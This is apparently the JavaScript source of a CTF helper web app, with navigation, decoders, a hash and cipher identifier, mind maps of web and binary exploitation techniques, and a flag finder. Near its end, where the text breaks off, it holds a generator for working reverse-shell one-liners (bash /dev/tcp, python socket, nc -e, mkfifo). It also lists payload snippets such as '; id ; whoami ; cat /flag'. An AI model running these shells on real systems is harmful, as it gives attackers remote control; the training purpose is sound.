// â•â•â• THEME â•â•â•
function toggleTheme(){const c=document.documentElement.getAttribute('data-theme')||'dark';const n=c==='dark'?'light':'dark';document.documentElement.setAttribute('data-theme',n);try{localStorage.setItem('ps-theme',n)}catch(e){}}
(function(){try{const t=localStorage.getItem('ps-theme');if(t)document.documentElement.setAttribute('data-theme',t);else if(!window.matchMedia('(prefers-color-scheme: dark)').matches)document.documentElement.setAttribute('data-theme','light')}catch(e){}})();

// â•â•â• LANDING â•â•â•
function showTeam(){document.getElementById('teamSection').classList.add('visible')}
function hideTeam(){document.getElementById('teamSection').classList.remove('visible')}
function enterApp(){
  document.getElementById('landing').classList.add('hidden');
  const app=document.getElementById('app');
  app.classList.add('visible');
  document.getElementById('cmdExplainBtn').classList.add('show');
  try{localStorage.setItem('ps-entered','1')}catch(e){}
  renderAll();
}
window.addEventListener('DOMContentLoaded',()=>{
  try{if(localStorage.getItem('ps-entered')){document.getElementById('landing').style.display='none';document.getElementById('app').classList.add('visible');document.getElementById('cmdExplainBtn').classList.add('show');renderAll()}}catch(e){}
});

// â•â•â• NAVIGATION â•â•â•
function show(id,btn){
  document.querySelectorAll('.page').forEach(p=>p.classList.remove('visible'));
  document.querySelectorAll('.nav-item').forEach(b=>b.classList.remove('active'));
  const el=document.getElementById(id);
  if(el)el.classList.add('visible');
  if(btn)btn.classList.add('active');
  document.querySelector('.sidebar')?.classList.remove('open');
  window.scrollTo({top:0,behavior:'instant'});
  document.querySelector('.main')?.scrollTo({top:0,behavior:'instant'});
  document.getElementById('globalSearch').value='';
  document.getElementById('searchDrop').innerHTML='';
  document.getElementById('searchDrop').classList.remove('open');
}
document.addEventListener('keydown',e=>{
  if(e.key==='Escape'){document.querySelector('.sidebar')?.classList.remove('open');if(notesOpen)toggleNotes();if(cmdExplainOpen)toggleCmdExplain();}
  const ctrlOrCmd=e.ctrlKey||e.metaKey;
  if(ctrlOrCmd&&e.key.toLowerCase()==='k'){
    e.preventDefault();
    const btn=[...document.querySelectorAll('.nav-item')].find(b=>b.getAttribute('onclick')?.includes("'cheatindex'"));
    show('cheatindex',btn);
    setTimeout(()=>document.getElementById('cheatIndexSearch')?.focus(),50);
  }
  if(ctrlOrCmd&&e.key.toLowerCase()==='s'){
    e.preventDefault();
    exportBackup();
  }
});

// â•â•â• ESC HTML â•â•â•
function escHtml(s){const d=document.createElement('div');d.textContent=s;return d.innerHTML;}
function escHtmlPre(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}

// â•â•â• COPY â•â•â•
function copyText(text,btn){navigator.clipboard.writeText(text).then(()=>{const o=btn?btn.textContent:'';if(btn){btn.textContent='Copied';setTimeout(()=>btn.textContent=o,1200);}}).catch(()=>{});}
function copyCmd(td){const t=td.textContent.replace(/&lt;/g,'<').replace(/&gt;/g,'>').replace(/&amp;/g,'&');navigator.clipboard.writeText(t).then(()=>{const o=td.style.color;td.style.color='var(--green)';setTimeout(()=>td.style.color=o,800);});}
function copyQtResult(id){const el=document.getElementById(id);if(el)navigator.clipboard.writeText(el.textContent).then(()=>{el.style.borderColor='var(--green)';setTimeout(()=>el.style.borderColor='',800);});}

// â•â•â• SEARCH â•â•â•
const PAGE_LABELS={'toolgrid-recon':['recon','Recon and OSINT'],'toolgrid-web':['web','Web Exploitation'],'toolgrid-pwn':['pwn','Binary Exploitation'],'toolgrid-re':['re','Reverse Engineering'],'toolgrid-crypto':['crypto','Cryptography'],'toolgrid-forensics':['forensics','Forensics'],'toolgrid-network':['forensics','Network'],'toolgrid-passwords':['passwords','Password Cracking'],'toolgrid-wireless':['wireless','Wireless'],'toolgrid-frameworks':['frameworks','Frameworks'],'toolgrid-utilities':['utilities','Utilities'],'toolgrid-misc':['utilities','Misc']};
function runSearch(){
  const q=document.getElementById('globalSearch').value.trim().toLowerCase();
  const drop=document.getElementById('searchDrop');
  if(!q||q.length<2){drop.innerHTML='';drop.classList.remove('open');return;}
  const hits=[];
  for(const[grid,tools]of Object.entries(TOOLS_DATA)){
    const[pid,label]=PAGE_LABELS[grid]||[grid,grid];
    for(const t of tools){if(hits.length>=10)break;if(t.name.toLowerCase().includes(q)||t.desc.toLowerCase().includes(q)){hits.push({tool:t,pid,label});}}
    if(hits.length>=10)break;
  }
  if(!hits.length){drop.innerHTML='<div class="search-empty">No tools found</div>';}
  else{drop.innerHTML=hits.map(h=>`<div class="search-item" data-pageid="${escHtml(h.pid)}" data-tool="${encodeURIComponent(h.tool.name)}" onclick="handleSidebarSearchClick(this)"><div class="search-item-name">${escHtml(h.tool.name)}</div><div class="search-item-cat">${escHtml(h.label)}</div></div>`).join('');}
  drop.classList.add('open');
}
function handleSidebarSearchClick(el){
  goToPageAndTool(el.dataset.pageid, decodeURIComponent(el.dataset.tool||''));
}
function goToPage(pid){const btn=[...document.querySelectorAll('.nav-item')].find(b=>b.getAttribute('onclick')?.includes(`'${pid}'`));show(pid,btn);}

// Navigate to a category page AND scroll to + highlight a specific tool card.
// Used by search results so "click Wireshark" stays on the Forensics page
// and jumps straight to the Wireshark card instead of just switching pages.
function goToPageAndTool(pid,toolName){
  goToPage(pid);
  const targetId='tool-'+slugify(toolName);
  setTimeout(()=>{
    const el=document.getElementById(targetId);
    if(!el)return;
    el.scrollIntoView({behavior:'smooth',block:'center'});
    el.classList.add('tool-highlighted');
    setTimeout(()=>el.classList.remove('tool-highlighted'),2600);
  },80);
}
document.addEventListener('click',e=>{if(!e.target.closest('.sidebar-search-wrap'))document.getElementById('searchDrop').classList.remove('open');});

// â•â•â• TOOL GRID RENDER â•â•â•
function slugify(s){return String(s).toLowerCase().replace(/[^a-z0-9]+/g,'-').replace(/(^-|-$)/g,'');}

function renderToolGrid(id,tools){
  const el=document.getElementById(id);
  if(!el)return;
  el.innerHTML=tools.map(t=>{
    const link=t.link?`<a class="tool-card-link" href="${escHtml(t.link)}" target="_blank" rel="noopener">${escHtml(t.link.replace(/^https?:\/\//,''))}</a>`:'';
    const why=t.why?`<div class="tool-card-why"><span class="tcw-label">Why</span>${escHtml(t.why)}</div>`:'';
    const tips=t.tips?`<div class="tool-card-tips"><span class="tcw-label">Tips</span>${escHtml(t.tips)}</div>`:'';
    return`<div class="tool-card" id="tool-${slugify(t.name)}"><div class="tool-card-head"><span class="tool-card-name">${escHtml(t.name)}</span><span class="tool-card-platform">${escHtml(t.platform||'')}</span></div><p class="tool-card-desc">${escHtml(t.desc)}</p>${why}${tips}${link}</div>`;
  }).join('');
}

// â•â•â• MIND MAP TREES â•â•â•
const TREE_DATA={
  recon:[
    {label:'Recon and OSINT',recommended:true,children:[
      {label:'Network Recon',children:[
        {label:'Port scanning',recommended:true,children:[{label:'Nmap',tag:'red',link:'https://nmap.org'},{label:'Masscan',link:'https://github.com/robertdavidgraham/masscan'}]},
        {label:'Service enumeration',children:[{label:'Netcat banner grab',recommended:true},{label:'Nmap -sV scripts'}]}
      ]},
      {label:'Web Discovery',recommended:true,children:[
        {label:'Directory brute force',recommended:true,children:[{label:'Gobuster',tag:'red',link:'https://github.com/OJ/gobuster'},{label:'Feroxbuster',tag:'red'},{label:'ffuf'}]},
        {label:'Subdomain enum',children:[{label:'Amass',tag:'red'},{label:'Subfinder'},{label:'dnsx'}]},
        {label:'Tech fingerprint',children:[{label:'Wappalyzer'},{label:'WhatWeb'},{label:'Nuclei'}]}
      ]},
      {label:'OSINT',children:[
        {label:'People and domains',children:[{label:'theHarvester',tag:'red'},{label:'Recon-ng'},{label:'SpiderFoot'}]},
        {label:'Search engines',recommended:true,children:[{label:'Google Dorks',tag:'red'},{label:'Shodan',tag:'red'},{label:'Censys'}]},
        {label:'Historical data',children:[{label:'Wayback Machine',tag:'red'},{label:'Waybackurls'}]}
      ]}
    ]}
  ],
  web:[
    {label:'Web Exploitation',recommended:true,children:[
      {label:'Injection attacks',recommended:true,children:[
        {label:'SQL Injection',recommended:true,children:[{label:'SQLMap',tag:'red',link:'https://sqlmap.org'},{label:'Manual: OR 1=1','tag':'green'},{label:'Burp Repeater'}]},
        {label:'SSTI',children:[{label:'Detect: {{7*7}}',tag:'red'},{label:'tplmap',tag:'red'},{label:'Jinja2 / Twig / Mako payloads'}]},
        {label:'Command injection',children:[{label:'Commix',tag:'red'},{label:'; id ; whoami ; cat /flag'}]},
        {label:'XXE',children:[{label:'Burp Suite',tag:'red'},{label:'DOCTYPE + ENTITY payload'}]}
      ]},
      {label:'Auth and tokens',children:[
        {label:'JWT attacks',recommended:true,children:[{label:'JWT Tool',tag:'red'},{label:'alg:none bypass'},{label:'RS256 to HS256 confusion'}]},
        {label:'Session manipulation',children:[{label:'Burp Suite',tag:'red'},{label:'Cookie editor extension'}]}
      ]},
      {label:'Discovery',recommended:true,children:[
        {label:'Fuzzing',recommended:true,children:[{label:'ffuf',tag:'red'},{label:'Gobuster',tag:'red'},{label:'Wfuzz'}]},
        {label:'Source code leaks',children:[{label:'git-dumper',tag:'red'},{label:'GitHack'}]},
        {label:'SSRF',children:[{label:'SSRFmap'},{label:'IP encoding bypass techniques'}]}
      ]}
    ]}
  ],
  pwn:[
    {label:'Binary Exploitation',recommended:true,children:[
      {label:'First steps',recommended:true,children:[
        {label:'checksec',tag:'red',recommended:true},{label:'file binary'},{label:'strings binary'}
      ]},
      {label:'Buffer Overflow',recommended:true,children:[
        {label:'Find offset',recommended:true,children:[{label:'cyclic (pwndbg)',tag:'red'},{label:'pattern_create PEDA'}]},
        {label:'Exploit',children:[{label:'ret2win',tag:'red'},{label:'ret2libc',tag:'red'},{label:'ROP chain'}]},
        {label:'Build chain',children:[{label:'ROPgadget',tag:'red'},{label:'ropper'},{label:'one_gadget'}]}
      ]},
      {label:'Format String',children:[
        {label:'Leak values with %x'},{label:'Write with %n'},{label:'pwntools fmtstr_payload'}
      ]},
      {label:'Heap Exploitation',children:[
        {label:'tcache poisoning'},{label:'fastbin attack'},{label:'GEF heap bins'}
      ]}
    ]}
  ],
  re:[
    {label:'Reverse Engineering',recommended:true,children:[
      {label:'Triage',recommended:true,children:[
        {label:'strings binary',tag:'red',recommended:true},{label:'file binary',tag:'red'},{label:'Detect-It-Easy (packers)'}
      ]},
      {label:'Static analysis',recommended:true,children:[
        {label:'Ghidra',tag:'red',recommended:true},{label:'IDA Free',tag:'red'},{label:'Binary Ninja'},{label:'Radare2'}
      ]},
      {label:'Dynamic analysis',children:[
        {label:'GDB + pwndbg',tag:'red'},{label:'ltrace strcmp leaks',tag:'red'},{label:'strace syscall trace'}
      ]},
      {label:'Automated solving',children:[
        {label:'angr symbolic exec',tag:'red'},{label:'z3 constraint solver',tag:'red'},{label:'Frida hooking'}
      ]},
      {label:'Specific targets',children:[
        {label:'.NET binaries',children:[{label:'dnSpy',tag:'red'}]},
        {label:'Android APK',children:[{label:'jadx',tag:'red'},{label:'apktool'}]},
        {label:'Packed binaries',children:[{label:'UPX unpack',tag:'red'}]}
      ]}
    ]}
  ],
  crypto:[
    {label:'Cryptography',recommended:true,children:[
      {label:'Encoding detection',recommended:true,children:[
        {label:'CyberChef Magic',tag:'red',recommended:true},{label:'Multi-Decoder (this tool)',tag:'red'},{label:'dCode.fr'}
      ]},
      {label:'Classical ciphers',children:[
        {label:'Caesar / ROT',children:[{label:'ROT13 auto-detect'},{label:'Caesar brute force'}]},
        {label:'Vigenere',children:[{label:'quipqiup',tag:'red'},{label:'Index of coincidence'}]},
        {label:'Substitution',children:[{label:'quipqiup',tag:'red'},{label:'Frequency analysis'}]}
      ]},
      {label:'Modern crypto',children:[
        {label:'RSA attacks',recommended:true,children:[{label:'RsaCtfTool',tag:'red'},{label:'FactorDB',tag:'red'},{label:'SageMath'}]},
        {label:'AES attacks',children:[{label:'Padding oracle'},{label:'CBC bit flip'}]},
        {label:'Hash cracking',children:[{label:'hashcat',tag:'red'},{label:'john',tag:'red'},{label:'CrackStation online'}]}
      ]}
    ]}
  ],
  forensics:[
    {label:'Forensics and Stego',recommended:true,children:[
      {label:'File analysis',recommended:true,children:[
        {label:'file + strings',tag:'red',recommended:true},{label:'binwalk -e',tag:'red'},{label:'exiftool',tag:'red'}
      ]},
      {label:'Image stego',children:[
        {label:'LSB detection',recommended:true,children:[{label:'zsteg -a',tag:'red'},{label:'StegSolve'}]},
        {label:'Hidden files',children:[{label:'steghide extract',tag:'red'},{label:'stegseek (crack pw)',tag:'red'}]},
        {label:'PNG chunks',children:[{label:'pngcheck -v'},{label:'xxd tail check'}]}
      ]},
      {label:'Memory forensics',children:[
        {label:'Volatility 3',tag:'red',recommended:true,children:[{label:'windows.pslist'},{label:'windows.netscan'},{label:'windows.dumpfiles'}]}
      ]},
      {label:'Network PCAP',children:[
        {label:'Wireshark',tag:'red',recommended:true},{label:'tshark CLI'},{label:'NetworkMiner (auto-extract)'}
      ]},
      {label:'Disk forensics',children:[
        {label:'Autopsy',tag:'red'},{label:'foremost file carving'},{label:'TestDisk recovery'}
      ]}
    ]}
  ]
};

function buildTreeNode(node,depth){
  const hasChildren=node.children&&node.children.length>0;
  const cls=['tree-node-item'];
  if(node.recommended)cls.push('recommended');
  if(node.tag==='red')cls.push('important');
  const dotStyle=node.tag==='red'?'background:var(--accent)':node.recommended?'background:var(--accent)':'';
  const tagHtml=node.tag?`<span class="tree-tag ${node.tag}">${node.tag==='red'?'KEY':'ok'}</span>`:'';
  const toggleIcon=hasChildren?`<span class="tree-toggle-icon">&#9660;</span>`:'<span class="tree-toggle-icon" style="opacity:0">&#9658;</span>';
  const linkAttr=node.link?` title="${escHtml(node.link)}" onclick="event.stopPropagation();window.open('${escHtml(node.link)}','_blank')"` : '';
  let html=`<div class="${cls.join(' ')}"${linkAttr} style="padding-left:${depth*4}px" ${hasChildren?`onclick="toggleNode(this)"`:''}>${toggleIcon}<span class="tree-node-dot" style="${dotStyle}"></span><span>${escHtml(node.label)}</span>${tagHtml}</div>`;
  if(hasChildren){
    const hidden=depth>0?'hidden':'';
    html+=`<div class="tree-children ${hidden}">${node.children.map(c=>buildTreeNode(c,depth+1)).join('')}</div>`;
  }
  return html;
}
function toggleNode(el){
  const children=el.nextElementSibling;
  if(!children||!children.classList.contains('tree-children'))return;
  const isHidden=children.classList.contains('hidden');
  children.classList.toggle('hidden',!isHidden);
  const icon=el.querySelector('.tree-toggle-icon');
  if(icon)icon.innerHTML=isHidden?'&#9660;':'&#9658;';
}
function toggleTree(id,expand){
  const container=document.getElementById(id);
  if(!container)return;
  container.querySelectorAll('.tree-children').forEach(c=>c.classList.toggle('hidden',!expand));
  container.querySelectorAll('.tree-toggle-icon').forEach(i=>i.innerHTML=expand?'&#9660;':'&#9658;');
}
function buildTree(id,data){
  const el=document.getElementById(id);
  if(!el||!data)return;
  el.innerHTML=data.map(n=>buildTreeNode(n,0)).join('');
  // auto-expand root
  el.querySelectorAll('.tree-children').forEach((c,i)=>{if(i===0)c.classList.remove('hidden');});
}

// â•â•â• MORSE â•â•â•
const MORSE_A={A:'.-',B:'-...',C:'-.-.',D:'-..',E:'.',F:'..-.',G:'--.',H:'....',I:'..',J:'.---',K:'-.-',L:'.-..',M:'--',N:'-.',O:'---',P:'.--.',Q:'--.-',R:'.-.',S:'...',T:'-',U:'..-',V:'...-',W:'.--',X:'-..-',Y:'-.--',Z:'--..'};
const MORSE_N={'0':'-----','1':'.----','2':'..---','3':'...--','4':'....-','5':'.....','6':'-....','7':'--...','8':'---..','9':'----.'};
const MORSE_REV={};
[...Object.entries(MORSE_A),...Object.entries(MORSE_N)].forEach(([l,c])=>MORSE_REV[c]=l);
function buildMorse(){
  const mg=document.getElementById('morseGrid'),mn=document.getElementById('morseNumbers');
  if(!mg||!mn)return;
  mg.innerHTML=Object.entries(MORSE_A).map(([l,c])=>`<div class="morse-cell"><div class="morse-letter">${l}</div><div class="morse-code">${c}</div></div>`).join('');
  mn.innerHTML=Object.entries(MORSE_N).map(([l,c])=>`<div class="morse-cell"><div class="morse-letter">${l}</div><div class="morse-code">${c}</div></div>`).join('');
}

// â•â•â• DECODER â•â•â•
function isPrint(s){if(!s)return false;let p=0;for(let i=0;i<s.length;i++){const c=s.charCodeAt(i);if((c>=32&&c<=126)||c===9||c===10||c===13)p++;}return p/s.length>0.85;}
const decoders={
  Base64:s=>{try{const c=s.trim();if(!/^[A-Za-z0-9+/]+={0,2}$/.test(c)||c.length%4)return null;const d=atob(c);return isPrint(d)?d:null;}catch{return null;}},
  Base32:s=>{try{const c=s.trim().toUpperCase().replace(/=+$/,'');if(!/^[A-Z2-7]+$/.test(c)||c.length<2)return null;const alpha='ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';let bits='';for(const ch of c){const i=alpha.indexOf(ch);if(i<0)return null;bits+=i.toString(2).padStart(5,'0');}let out='';for(let i=0;i+8<=bits.length;i+=8)out+=String.fromCharCode(parseInt(bits.substr(i,8),2));return isPrint(out)&&out.length?out:null;}catch{return null;}},
  Hex:s=>{try{const c=s.trim().replace(/^0x/i,'').replace(/\s+/g,'').replace(/0x/gi,'');if(!/^[0-9a-fA-F]+$/.test(c)||c.length%2<1||c.length<2)return null;let out='';for(let i=0;i<c.length;i+=2)out+=String.fromCharCode(parseInt(c.substr(i,2),16));return isPrint(out)?out:null;}catch{return null;}},
  Binary:s=>{try{const c=s.trim().replace(/\s+/g,'');if(!/^[01]+$/.test(c)||c.length%8||c.length<8)return null;let out='';for(let i=0;i<c.length;i+=8)out+=String.fromCharCode(parseInt(c.substr(i,8),2));return isPrint(out)?out:null;}catch{return null;}},
  ROT13:s=>/[a-zA-Z]/.test(s)?s.replace(/[a-zA-Z]/g,c=>{const b=c<='Z'?65:97;return String.fromCharCode((c.charCodeAt(0)-b+13)%26+b);}):null,
  ROT47:s=>/[!-~]/.test(s)?s.replace(/[!-~]/g,c=>String.fromCharCode(33+(c.charCodeAt(0)-33+47)%94)):null,
  Atbash:s=>/[a-zA-Z]/.test(s)?s.replace(/[a-zA-Z]/g,c=>c>='a'&&c<='z'?String.fromCharCode(122-(c.charCodeAt(0)-97)):String.fromCharCode(90-(c.charCodeAt(0)-65))):null,
  Morse:s=>{try{const c=s.trim().replace(/Â·/g,'.').replace(/_/g,'-');if(!/^[.\- /]+$/.test(c)||!/[.-]/.test(c))return null;const words=c.split(/\s*\/\s*|\s{2,}/);const r=words.map(w=>w.trim().split(/\s+/).map(code=>MORSE_REV[code]||'').join('')).join(' ');return r.trim()||null;}catch{return null;}},
  'URL decode':s=>{try{if(!/%[0-9a-fA-F]{2}/.test(s))return null;const d=decodeURIComponent(s);return d!==s?d:null;}catch{return null;}},
  Reversed:s=>{const r=s.split('').reverse().join('');return r!==s&&r.trim()?r:null;},
  'Caesar (brute)':s=>{if(!/[a-zA-Z]{4,}/.test(s))return null;const cw=/\b(the|and|flag|is|you|from)\b/i;for(let n=1;n<26;n++){if(n===13)continue;const sh=s.replace(/[a-zA-Z]/g,c=>{const b=c<='Z'?65:97;return String.fromCharCode((c.charCodeAt(0)-b+n)%26+b);});if(cw.test(sh))return`shift ${n}: ${sh}`;}return null;}
};
function runDecoder(){
  const input=document.getElementById('decoderInput').value;
  const out=document.getElementById('decoderResults');
  if(!input.trim()){out.innerHTML='';return;}
  out.innerHTML=Object.entries(decoders).map(([label,fn])=>{
    let val=null;try{val=fn(input);}catch(e){}
    const has=val!==null&&val!==undefined&&val.trim()!=='';
    return`<div class="decoder-row ${has?'active':''}"><span class="decoder-label">${label}</span><span class="decoder-value ${has?'':'empty'}">${has?escHtml(val):'no match'}</span>${has?`<button class="copy-btn" onclick="copyText(${JSON.stringify(val)},this)">Copy</button>`:''}</div>`;
  }).join('');
}
let xorMode='printable';

function setXorMode(mode,btn){
  xorMode=mode;
  document.querySelectorAll('.xor-toggle-btn').forEach(b=>b.classList.remove('active'));
  if(btn)btn.classList.add('active');
  runXor();
}

function printablePercent(str){
  if(!str.length)return 0;
  let p=0;
  for(let i=0;i<str.length;i++){const c=str.charCodeAt(i);if((c>=32&&c<=126)||c===9||c===10||c===13)p++;}
  return Math.round((p/str.length)*100);
}

function runXor(){
  const input=document.getElementById('xorInput').value.trim().replace(/\s+/g,'').replace(/^0x/i,'');
  const out=document.getElementById('xorResults');
  if(!input){out.innerHTML='';return;}
  if(!/^[0-9a-fA-F]+$/.test(input)||input.length%2){out.innerHTML='<div class="decoder-row"><span class="decoder-value empty">Enter valid hex bytes (even length)</span></div>';return;}
  const bytes=[];for(let i=0;i<input.length;i+=2)bytes.push(parseInt(input.substr(i,2),16));
  const rows=[];
  for(let key=0;key<256;key++){
    const str=bytes.map(b=>String.fromCharCode(b^key)).join('');
    const pct=printablePercent(str);
    if(xorMode==='printable'){ if(pct>85&&/[a-zA-Z]{3,}/.test(str))rows.push({key,str,pct}); }
    else{ rows.push({key,str,pct}); }
  }
  if(!rows.length){out.innerHTML='<div class="decoder-row"><span class="decoder-value empty">No results â€” try Full 256 mode</span></div>';return;}
  const limited=rows.slice(0,xorMode==='full256'?256:20);
  let html=limited.map(r=>{
    const kh='0x'+r.key.toString(16).padStart(2,'0');
    const kc=r.key>=32&&r.key<127?` ('${escHtml(String.fromCharCode(r.key))}')`:'';
    return `<div class="decoder-row ${r.pct>85?'active':''}"><span class="decoder-label">${kh}${kc}</span><span class="decoder-value">${escHtml(r.str)}</span><span class="xor-meta">${r.pct}% printable</span><button class="copy-btn" onclick="copyText(${JSON.stringify(r.str)},this)">Copy</button></div>`;
  }).join('');
  if(rows.length>limited.length)html+=`<div class="decoder-row"><span class="decoder-value empty">+${rows.length-limited.length} more (switch mode or narrow input)</span></div>`;
  out.innerHTML=html;
}

// â•â•â• ASCII â•â•â•
const ASCII_DESC={0:'NUL',1:'SOH',2:'STX',3:'ETX',4:'EOT',5:'ENQ',6:'ACK',7:'BEL',8:'Backspace',9:'Tab',10:'Line Feed',11:'VT',12:'Form Feed',13:'Carriage Return',27:'Escape',32:'Space',127:'Delete'};
function buildAscii(){
  const tb=document.getElementById('asciiBody');if(!tb)return;
  let h='';
  for(let i=0;i<=127;i++){const hex='0x'+i.toString(16).toUpperCase().padStart(2,'0');const bin=i.toString(2).padStart(8,'0');const char=(i<32||i===127)?'-':(i===32?'(space)':escHtml(String.fromCharCode(i)));const desc=ASCII_DESC[i]||(i>=48&&i<=57?'Digit':i>=65&&i<=90?'Uppercase':i>=97&&i<=122?'Lowercase':'Symbol');h+=`<tr data-dec="${i}" data-hex="${i.toString(16)}" data-char="${i>=32&&i<127?String.fromCharCode(i):''}"><td>${i}</td><td>${hex}</td><td>${bin}</td><td class="ascii-char">${char}</td><td>${desc}</td></tr>`;}
  tb.innerHTML=h;
}
function filterAscii(){
  const q=document.getElementById('asciiSearch').value.trim().toLowerCase();
  document.querySelectorAll('#asciiBody tr').forEach(row=>{if(!q){row.style.display='';return;}const m=row.dataset.dec===q||row.dataset.hex===q||'0x'+row.dataset.hex===q||(row.dataset.char&&row.dataset.char.toLowerCase()===q);row.style.display=m?'':'none';});
}
function filterSigs(){const q=document.getElementById('sigSearch').value.trim().toLowerCase().replace(/0x/g,'');document.querySelectorAll('#sigBody tr').forEach(r=>{r.style.display=(!q||r.textContent.toLowerCase().includes(q))?'':'none';});}

// â•â•â• QUICK TOOLS â•â•â•
function identifyHash(){
  const h=document.getElementById('hashInput').value.trim();
  const out=document.getElementById('hashResult');
  if(!h){out.textContent='Waiting for hash...';out.className='qt-result';return;}
  const len=h.length;const isHex=/^[0-9a-fA-F]+$/.test(h);
  const results=[];
  if(isHex){
    if(len===32)results.push({name:'MD5',mode:'0'},{name:'NTLM',mode:'1000'},{name:'MD4',mode:'900'});
    if(len===40)results.push({name:'SHA-1',mode:'100'},{name:'SHA-1 HMAC',mode:'150'});
    if(len===56)results.push({name:'SHA-224',mode:'1300'});
    if(len===64)results.push({name:'SHA-256',mode:'1400'},{name:'SHA3-256',mode:'17300'});
    if(len===96)results.push({name:'SHA-384',mode:'10800'});
    if(len===128)results.push({name:'SHA-512',mode:'1700'},{name:'SHA3-512',mode:'17500'});
    if(len===16)results.push({name:'MD5 (half)',mode:'?'});
  }
  if(h.startsWith('$2a$')||h.startsWith('$2b$')||h.startsWith('$2y$'))results.push({name:'bcrypt',mode:'3200'});
  if(h.startsWith('$6$'))results.push({name:'sha512crypt',mode:'1800'});
  if(h.startsWith('$5$'))results.push({name:'sha256crypt',mode:'7400'});
  if(h.startsWith('$1$'))results.push({name:'md5crypt',mode:'500'});
  if(h.startsWith('$apr1$'))results.push({name:'APR1-MD5',mode:'1600'});
  if(h.startsWith('sha1$'))results.push({name:'Django SHA1',mode:'124'});
  if(/^[A-Za-z0-9+/]{43}=$/.test(h))results.push({name:'SHA-256 base64',mode:'1400'});
  if(!results.length){out.textContent='Unknown hash type. Try name-that-hash or hash-identifier.';out.className='qt-result';return;}
  out.className='qt-result match';
  out.innerHTML=results.map(r=>`<div style="display:flex;justify-content:space-between;padding:2px 0;border-bottom:1px solid var(--border);font-size:11.5px;"><span style="font-weight:600;color:var(--text)">${escHtml(r.name)}</span><span style="color:var(--text-faint)">hashcat -m ${r.mode}</span></div>`).join('');
}

function identifyCipher(){
  const t=document.getElementById('cipherInput').value.trim();
  const out=document.getElementById('cipherResult');
  if(!t){out.textContent='Waiting for input...';out.className='qt-result';return;}
  const guesses=[];
  if(/^[A-Za-z0-9+/]+=*$/.test(t)&&t.length%4===0&&t.length>8)guesses.push({name:'Base64',action:'Try Multi-Decoder'});
  if(/^[A-Z2-7]+=*$/.test(t)&&t.length%8===0)guesses.push({name:'Base32',action:'Try Multi-Decoder'});
  if(/^[0-9a-fA-F\s]+$/.test(t)&&t.replace(/\s/g,'').length%2===0&&t.length>4)guesses.push({name:'Hexadecimal',action:'Try Multi-Decoder'});
  if(/^[01\s]+$/.test(t)&&t.replace(/\s/g,'').length%8===0&&t.length>16)guesses.push({name:'Binary',action:'Try Multi-Decoder'});
  if(/^[.\-/ ]+$/.test(t))guesses.push({name:'Morse Code',action:'Try Multi-Decoder'});
  if(/^[A-Za-z0-9._%+-]+\.[A-Za-z0-9._%+-]+\.[A-Za-z0-9._%+-]+$/.test(t)&&t.startsWith('eyJ'))guesses.push({name:'JWT (JSON Web Token)',action:'Decode header.payload with base64'});
  if(/[a-z]/.test(t)&&/[A-Z]/.test(t)&&/^[A-Za-z]+$/.test(t.replace(/\s/g,'')))guesses.push({name:'Possible Caesar / ROT cipher',action:'Try Multi-Decoder ROT13'});
  if(/^[A-Z\s]+$/.test(t)&&t.length>8)guesses.push({name:'Possible classical substitution',action:'Try quipqiup.com'});
  if(/^[-\sA-Z0-9\/+]+={0,2}$/.test(t)&&t.includes('=='))guesses.push({name:'Likely Base64 (padded)',action:'Try Multi-Decoder'});
  if(/^\d+(\s\d+)+$/.test(t))guesses.push({name:'Decimal ASCII values',action:'python3 -c "print(bytes([VALS]))"'});
  if(!guesses.length){out.textContent='No strong pattern match. Try CyberChef Magic mode or dCode.fr cipher identifier.';out.className='qt-result';return;}
  out.className='qt-result match';
  out.innerHTML=guesses.map(g=>`<div style="display:flex;justify-content:space-between;padding:2px 0;border-bottom:1px solid var(--border);font-size:11.5px;"><span style="font-weight:600;color:var(--text)">${escHtml(g.name)}</span><span style="color:var(--text-faint)">${escHtml(g.action)}</span></div>`).join('');
}

function convertBase(){
  const from=parseInt(document.getElementById('baseFrom').value);
  const val=document.getElementById('baseInput').value.trim();
  const out=document.getElementById('baseResult');
  if(!val){out.textContent='Waiting...';out.className='qt-result';return;}
  try{
    const n=parseInt(val,from);
    if(isNaN(n)){out.textContent='Invalid value for selected base';out.className='qt-result';return;}
    out.className='qt-result match';
    out.textContent=`Dec:  ${n}\nHex:  0x${n.toString(16).toUpperCase()}\nBin:  ${n.toString(2)}\nOct:  ${n.toString(8)}\nASCII: ${n>=32&&n<=126?String.fromCharCode(n):'N/A'}`;
  }catch{out.textContent='Invalid input';out.className='qt-result';}
}

function huntFlags(){
  const text=document.getElementById('flagInput').value;
  const out=document.getElementById('flagResult');
  if(!text){out.textContent='Waiting for input...';out.className='qt-result';return;}
  const patterns=[/flag\{[^}]+\}/gi,/ctf\{[^}]+\}/gi,/picoctf\{[^}]+\}/gi,/htb\{[^}]+\}/gi,/thm\{[^}]+\}/gi,/[A-Za-z0-9_]+\{[A-Za-z0-9_!@#$%^&*\-+=.?,/\\| ]{6,}\}/gi,/[A-Fa-f0-9]{32,128}/g];
  const found=new Set();
  patterns.forEach(p=>{const m=text.match(p);if(m)m.forEach(x=>found.add(x));});
  if(!found.size){out.textContent='No flag-like patterns found.';out.className='qt-result';return;}
  out.className='qt-result match';
  out.innerHTML=[...found].map(f=>`<div style="display:flex;justify-content:space-between;align-items:center;padding:2px 0;border-bottom:1px solid var(--border);gap:.5rem;"><span style="font-family:var(--mono);font-size:11px;word-break:break-all;">${escHtml(f)}</span><button class="copy-btn" onclick="copyText(${JSON.stringify(f)},this)">Copy</button></div>`).join('');
}

const RSHELLS={
  bash:(ip,port)=>`bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
  python3:(ip,port)=>`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
  python2:(ip,port)=>`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
  nc:(ip,port)=>`nc -e /bin/bash ${ip} ${port}`,
  'nc-e':(ip,port)=>`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`,
